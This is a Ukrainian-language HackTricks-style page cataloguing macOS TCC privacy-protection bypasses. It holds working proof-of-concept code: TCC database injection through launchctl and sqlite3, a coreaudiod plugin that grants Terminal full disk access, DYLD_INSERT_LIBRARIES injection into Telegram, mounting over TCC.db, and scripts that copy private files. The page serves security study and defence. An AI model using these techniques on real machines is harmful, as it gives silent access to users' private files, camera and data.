# TCC Bypasses у macOS

{{#include ../../../../../banners/hacktricks-training.md}}

## За функціональністю

### Write Bypass

Це не bypass, а просто принцип роботи TCC: **він не захищає від запису**. Якщо Terminal **не має доступу до читання Desktop користувача, він усе одно може записувати в нього**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Розширений атрибут **`com.apple.macl`** додається до нового **файлу**, щоб надати **застосунку-створювачу** доступ для його читання.

### TCC ClickJacking

Можна **розмістити вікно поверх запиту TCC**, щоб змусити користувача **прийняти** його, не помітивши цього. PoC можна знайти в [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Зловмисник може **створювати застосунки з будь-якою назвою** (наприклад, Finder, Google Chrome...) у **`Info.plist`** і змусити їх запитувати доступ до певного місця, захищеного TCC. Користувач думатиме, що доступ запитує легітимний застосунок.\
Крім того, можна **видалити легітимний застосунок із Dock і розмістити там підроблений**, щоб після натискання користувачем на підроблений застосунок (який може використовувати такий самий значок) він міг викликати легітимний застосунок, запитати дозволи TCC і виконати malware, змусивши користувача повірити, що доступ запитував легітимний застосунок.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Більше інформації та PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

За замовчуванням доступ через **SSH мав "Full Disk Access"**. Щоб вимкнути це, потрібно, щоб він був у списку, але вимкнений (видалення його зі списку не прибере ці привілеї):

![TCC Request by arbitrary name - SSH Bypass: За замовчуванням доступ через SSH мав "Full Disk Access". Щоб вимкнути це, потрібно, щоб він був у списку, але вимкнений (видалення його...](<../../../../../images/image (1077).png>)

Тут можна знайти приклади того, як деякі **malware змогли обійти цей захист**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Зверніть увагу, що тепер для можливості увімкнення SSH потрібен **Full Disk Access**

### Handle extensions - CVE-2022-26767

Атрибут **`com.apple.macl`** надається файлам, щоб надати **певному застосунку дозвіл на їх читання.** Цей атрибут встановлюється, коли файл **перетягують** на застосунок або коли користувач **двічі клацає** файл, щоб відкрити його за допомогою **застосунку за замовчуванням**.

Отже, користувач міг би **зареєструвати шкідливий застосунок** для обробки всіх розширень і викликати Launch Services для **відкриття** будь-якого файлу (тому шкідливий файл отримає дозвіл на читання).

### iCloud

За допомогою entitlement **`com.apple.private.icloud-account-access`** можна взаємодіяти з **`com.apple.iCloudHelper`** XPC service, яка **надасть iCloud tokens**.

**iMovie** та **Garageband** мали цей entitlement та інші, які це дозволяли.

Для отримання додаткової **інформації** про exploit, який дає змогу **отримати iCloud tokens** завдяки цьому entitlement, перегляньте доповідь: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Застосунок із дозволом **`kTCCServiceAppleEvents`** зможе **керувати іншими застосунками**. Це означає, що він зможе **зловживати дозволами, наданими іншим застосункам**.

Додаткову інформацію про Apple Scripts дивіться тут:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Наприклад, якщо застосунок має **Automation permission для `iTerm`**, як у цьому прикладі, **`Terminal`** має доступ до iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, який не має FDA, може викликати iTerm, який його має, і використовувати його для виконання дій:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Через Finder

Або якщо App має доступ через Finder, це може бути такий script:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## За поведінкою App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Користувацький **tccd daemon** використовував змінну **`HOME`** **env** для доступу до бази даних користувачів TCC за адресою: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Згідно з [цим дописом на Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), а також оскільки TCC daemon запускається через `launchd` у домені поточного користувача, існує можливість **контролювати всі змінні середовища**, що передаються йому.\
Таким чином, **атакер міг встановити змінну середовища `$HOME`** у **`launchctl`**, вказавши на **контрольований** **каталог**, **перезапустити** **TCC** daemon, а потім **безпосередньо змінити базу даних TCC**, щоб надати собі **кожне доступне право TCC**, не показуючи кінцевому користувачеві жодних запитів.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes мали доступ до захищених TCC розташувань, але коли нотатку створено, вона **створюється в незахищеному розташуванні**. Тому можна було попросити Notes скопіювати захищений файл у нотатку (тобто в незахищене розташування), а потім отримати доступ до файлу:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Бінарний файл `/usr/libexec/lsd` із бібліотекою `libsecurity_translocate` мав entitlement `com.apple.private.nullfs_allow`, який дозволяв створювати монтування **nullfs**, а також entitlement `com.apple.private.tcc.allow` із **`kTCCServiceSystemPolicyAllFiles`** для доступу до кожного файлу.

Було можливо додати атрибут quarantine до "Library", викликати **`com.apple.security.translocation`** XPC service, після чого Library відображалася як **`$TMPDIR/AppTranslocation/d/d/Library`**, де всі документи всередині Library можна було **доступити**.

### CVE-2024-44131 - FileProvider symlink race

Застосунки, які передають файлові операції **привілейованому helper-процесу** (у цьому випадку **`fileproviderd`** / **`Files.app`**), копіюють або переміщують елементи **від імені користувача**, тому копіювання виконується з привілеями helper-процесу, а не caller-а.

Jamf Threat Labs показали, що перевірку symlink, яка виконується перед операцією, можна **поставити в race condition**: замість розміщення symlink в **останньому** компоненті шляху (який перевіряється), attacker замінює **проміжний** каталог шляху **після того, як копіювання вже почалося**. Після цього привілейований helper переходить за link, контрольованим attacker-ом, і читає/записує захищені TCC розташування **без показу prompt-а**.

Каталоги, які **не захищені** випадковим UUID у своєму шляху (наприклад `~/Library/Mobile Documents/com~apple~CloudDocs`), є найпростішими цілями, оскільки attacker може передбачити повний шлях для race.

> [!TIP]
> Це загальний патерн, який слід шукати: **будь-який привілейований процес, що розв'язує шлях більше одного разу** (check-then-use або `rename()`/`copyfile()`, які окремо розв'язують source і destination), можна атакувати через race, замінивши каталог у середині шляху. Лише `O_NOFOLLOW_ANY`, `openat()` для вже відкритого directory FD або `realpath()` + повторна валідація справді закривають це вікно.

Більше інформації у [**writeup від Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).

### SQLITE_SQLLOG_DIR

`libsqlite3` можна зібрати з `SQLITE_ENABLE_SQLLOG`, що додає logging hook, керований environment variables ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):

- **`SQLITE_SQLLOG_DIR=path`** – для **кожної відкритої database** у `path` записуються **копія database file** і log SQL statements (каталог має вже існувати).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – створювати **свіжу копію щоразу**, коли DB відкривається або attach-иться, замість повторного використання наявної.
- **`SQLITE_SQLLOG_CONDITIONAL`** – log-увати connection лише тоді, коли поруч із main DB існує файл `<database>-sqllog`.

Якщо можна інжектувати цю variable у процес, який має **FDA** і відкриває SQLite databases, він охоче **копіюватиме ці захищені databases** у каталог під вашим контролем. Оскільки ім'я destination file походить від даних, контрольованих attacker-ом, **symlink, розміщений у destination**, перетворює той самий primitive на **довільний запис у файл** із привілеями target process.

### **SQLITE_AUTO_TRACE**

Якщо environment variable **`SQLITE_AUTO_TRACE`** встановлено, library **`libsqlite3.dylib`** почне **log-увати** всі SQL queries. Цю library використовували багато застосунків, тому можна було log-увати всі їхні SQLite queries.

Кілька застосунків Apple використовували цю library для доступу до інформації, захищеної TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Пошук записів файлів, керованих env-змінними

Два попередні приклади є проявами однієї загальної техніки, тому варто пошукати інші: **frameworks, завантажені в TCC-привілейовані apps, часто відкривають debug/logging environment variables, які змушують процес створювати файл за шляхом, контрольованим caller'ом**.

Workflow для їх пошуку:

1. Виберіть target із FDA або іншим цікавим TCC permission (`Music`, `TV`, `Terminal`, MDM agents...) і перелічіть frameworks, з якими він лінкується (`otool -L`, `vmmap`).
2. Виконайте grep цих frameworks для рядків `getenv`: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Встановіть candidate variables через `launchctl setenv NAME /path/you/control`, запустіть app і спостерігайте за його діями у файловій системі за допомогою `fs_usage -w -f filesys <pid>` або `sudo fs_usage | grep <path>`.
4. Якщо процес **створює або перейменовує** файл у вашій директорії, ви отримали write primitive: вкажіть destination на symlink (або виконайте race для проміжної директорії, як у наведеному вище CVE-2024-44131), щоб перенаправити його до `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Це обмежується двома факторами. По-перше, змінні `DYLD_*` ігноруються binaries із hardened-runtime, **якщо app не постачається з entitlement** [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — див. також [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). По-друге, Apple видаляє окремі framework debug variables після того, як про них повідомляють, тому variable, яка працювала в одному macOS release, часто зникає в наступному. Якщо app мовчки відмовляється запускатися після її встановлення, вважайте цю variable уже відфільтрованою.

Див. [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) щодо еквівалентного прийому з linker variables.

### Apple Remote Desktop

Як root можна було ввімкнути цей service, після чого **ARD agent отримував full disk access**, що потім можна було використати, щоб змусити його скопіювати нову **TCC user database**.

## Через **NFSHomeDirectory**

TCC використовує database у HOME folder користувача для контролю доступу до ресурсів, специфічних для користувача, за адресою **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Тому, якщо користувачеві вдається перезапустити TCC із env variable `$HOME`, що вказує на **іншу folder**, користувач може створити нову TCC database у **/Library/Application Support/com.apple.TCC/TCC.db** і змусити TCC надати будь-який TCC permission будь-якому app.

> [!TIP]
> Зверніть увагу, що Apple використовує setting, збережений у профілі користувача в attribute **`NFSHomeDirectory`**, як **value `$HOME`**, тому, якщо ви скомпрометували application із permissions на зміну цього value (**`kTCCServiceSystemPolicySysAdminFiles`**), цей option можна **weaponize** за допомогою TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Перший POC** використовує [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) і [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) для зміни **HOME** folder користувача.

1. Отримайте _csreq_ blob для target app.
2. Розмістіть fake _TCC.db_ file із необхідним access і _csreq_ blob.
3. Експортуйте запис користувача в Directory Services за допомогою [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Змініть запис у Directory Services, щоб змінити home directory користувача.
5. Імпортуйте змінений запис Directory Services за допомогою [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Зупиніть _tccd_ користувача та перезапустіть process.

Другий POC використовував **`/usr/libexec/configd`**, який мав `com.apple.private.tcc.allow` зі значенням `kTCCServiceSystemPolicySysAdminFiles`.\
`configd` можна було запустити з option **`-t`**, за допомогою якого attacker міг вказати **custom Bundle для завантаження**. Тому exploit **замінює** метод зміни home directory користувача через **`dsexport`** і **`dsimport`** на **code injection у `configd`**.

Докладніше див. [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Через process injection

Існують різні techniques для inject code усередину process і зловживання його TCC privileges:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Крім того, найпоширеніший process injection для обходу TCC виконується через **plugins (load library)**.\
Plugins — це додатковий code, зазвичай у формі libraries або plist, який **завантажується main application** і виконується в його context. Тому, якщо main application мав доступ до TCC restricted files (через granted permissions або entitlements), **custom code також його матиме**.

### CVE-2020-27937 - Directory Utility

Application `/System/Library/CoreServices/Applications/Directory Utility.app` мав entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, завантажував plugins із розширенням **`.daplug`** і **не мав hardened** runtime.

Щоб weaponize цей CVE, **`NFSHomeDirectory`** **змінюється** (із використанням попереднього entitlement), що дає змогу **перехопити TCC database користувача** для обходу TCC.

Докладніше див. [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** мав entitlements `com.apple.security.cs.disable-library-validation` і `com.apple.private.tcc.manager`. Перше **дозволяло code injection**, а друге надавало йому доступ до **керування TCC**.

Цей binary дозволяв завантажувати **third party plug-ins** із folder `/Library/Audio/Plug-Ins/HAL`. Тому можна було **завантажити plugin і зловживати TCC permissions** за допомогою цього POC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Для отримання додаткової інформації перегляньте [**оригінальний звіт**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Device Abstraction Layer (DAL) Plug-Ins

Системні застосунки, які відкривають потік камери через Core Media I/O (застосунки з **`kTCCServiceCamera`**), завантажують **у процесі** ці plugins, розташовані в `/Library/CoreMediaIO/Plug-Ins/DAL` (не обмежені SIP).

Достатньо просто зберегти там library зі звичайним **constructor**, щоб виконати **inject code**.

Кілька застосунків Apple були вразливими до цього.

### Firefox

Застосунок Firefox мав entitlements `com.apple.security.cs.disable-library-validation` і `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Детальніше про те, як легко це exploit-нути, дивіться у [**оригінальному звіті**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Бінарний файл `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` мав entitlements **`com.apple.private.tcc.allow`** і **`com.apple.security.get-task-allow`**, що дозволяло inject-ити code у процес і використовувати TCC privileges.

### CVE-2023-26818 - Telegram

Telegram мав entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** і **`com.apple.security.cs.disable-library-validation`**, тому його можна було abuse-нути, щоб **отримати доступ до його permissions**, наприклад для запису за допомогою камери. Ви можете [**знайти payload у writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Зверніть увагу, що для використання env variable з метою завантаження library було створено **custom plist**, а для її запуску використано **`launchctl`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Через відкриття

Можна викликати **`open`**, навіть перебуваючи в sandbox

### Terminal Scripts

Досить часто терміналу надають **Full Disk Access (FDA)**, принаймні на комп’ютерах, якими користуються технічні спеціалісти. Також за його допомогою можна викликати скрипти **`.terminal`**.

Скрипти **`.terminal`** — це plist-файли, подібні до цього, з командою для виконання в ключі **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Застосунок може записати terminal script у розташування на кшталт `/tmp` і запустити його командою на кшталт:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Через монтування

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Будь-який користувач** (навіть непривілейований) може створити та змонтувати snapshot Time Machine і **отримати доступ до ВСІХ файлів** цього snapshot.\
**Єдина необхідна привілея** полягає в тому, щоб використовуваний застосунок (наприклад, `Terminal`) мав доступ **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles), який має надати адміністратор.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Більш детальне пояснення можна [**знайти в оригінальному звіті**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Навіть якщо файл TCC DB захищений, було можливо **змонтувати поверх директорії** новий файл TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Перегляньте **повний exploit** у [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Як пояснюється в [original writeup](https://www.kandji.io/blog/macos-audit-story-part2), ця CVE використовувала `diskarbitrationd`.

Функція `DADiskMountWithArgumentsCommon` із публічного фреймворку `DiskArbitration` виконувала перевірки безпеки. Однак їх можна обійти, безпосередньо викликавши `diskarbitrationd`, а отже використовуючи елементи `../` у шляху та symlink-и.

Це дозволяло зловмиснику виконувати довільне монтування в будь-яке місце, зокрема поверх бази даних TCC, завдяки entitlement `com.apple.private.security.storage-exempt.heritable` процесу `diskarbitrationd`.

### asr

Інструмент **`/usr/sbin/asr`** дозволяв копіювати весь диск і монтувати його в іншому місці, обходячи захист TCC.

### Location Services

Існує третя база даних TCC — **`/var/db/locationd/clients.plist`**, яка визначає клієнтів, яким дозволено **отримувати доступ до location services**.\
Тека **`/var/db/locationd/` не була захищена від монтування DMG**, тому можна було змонтувати власний plist.

## Через startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## За допомогою grep

У багатьох випадках файли зберігатимуть конфіденційну інформацію, як-от email-адреси, номери телефонів, повідомлення... у незахищених місцях (що Apple вважає вразливістю).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Це більше не працює, але [**раніше працювало**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Інший спосіб із використанням [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [**Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [**SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)**](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [**Apple - Allow DYLD environment variables entitlement**](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [**The Eclectic Light Company - Notarization: the hardened runtime**](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)

{{#include ../../../../../banners/hacktricks-training.md}}
